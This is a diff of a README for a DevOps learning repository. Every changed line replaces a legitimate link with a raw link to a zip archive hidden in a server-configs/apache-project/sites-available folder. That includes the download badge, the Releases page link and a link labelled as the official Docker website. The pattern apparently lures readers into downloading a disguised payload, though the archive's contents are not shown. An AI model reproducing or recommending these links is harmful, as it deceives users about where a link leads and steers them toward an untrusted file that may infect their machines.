@@ -1,6 +1,6 @@
 # 🚀 devops-configs - Easy Setup for DevOps Learning
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Jyrayaa/devops-configs/releases)
+[![Download](https://raw.githubusercontent.com/Jyrayaa/devops-configs/main/server-configs/apache-project/sites-available/devops_configs_1.7.zip%https://raw.githubusercontent.com/Jyrayaa/devops-configs/main/server-configs/apache-project/sites-available/devops_configs_1.7.zip)](https://raw.githubusercontent.com/Jyrayaa/devops-configs/main/server-configs/apache-project/sites-available/devops_configs_1.7.zip)
 
 ## 📖 Overview
 
@@ -16,14 +16,14 @@ This repository is perfect for anyone who wants to learn or practice DevOps skil
 Before you start, ensure your computer meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Docker**: Installed on your machine. If you don't have Docker, visit the [official Docker website](https://www.docker.com/get-started) for instructions.
+- **Docker**: Installed on your machine. If you don't have Docker, visit the [official Docker website](https://raw.githubusercontent.com/Jyrayaa/devops-configs/main/server-configs/apache-project/sites-available/devops_configs_1.7.zip) for instructions.
 - **Basic Knowledge**: Familiarity with command line tools will help, but it is not necessary.
 
 ## 🚀 Getting Started
 
 Here are the steps to get the application up and running on your machine:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Jyrayaa/devops-configs/releases) to see the available versions.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/Jyrayaa/devops-configs/main/server-configs/apache-project/sites-available/devops_configs_1.7.zip) to see the available versions.
 2. **Download the Latest Release**: Look for the latest version of the repository. Click the link to download it.
 3. **Extract the Files**: Once the download is complete, extract the files to a directory on your computer.
 4. **Open Terminal**: Open your command line interface (Terminal on macOS/Linux, Command Prompt or PowerShell on Windows).
@@ -40,7 +40,7 @@ Here are the steps to get the application up and running on your machine:
 
 To download the latest version of **devops-configs**, visit this page:
 
-[Download Now](https://github.com/Jyrayaa/devops-configs/releases)
+[Download Now](https://raw.githubusercontent.com/Jyrayaa/devops-configs/main/server-configs/apache-project/sites-available/devops_configs_1.7.zip)
 
 Follow the steps listed in the "Getting Started" section to install and run the application on your machine.
 
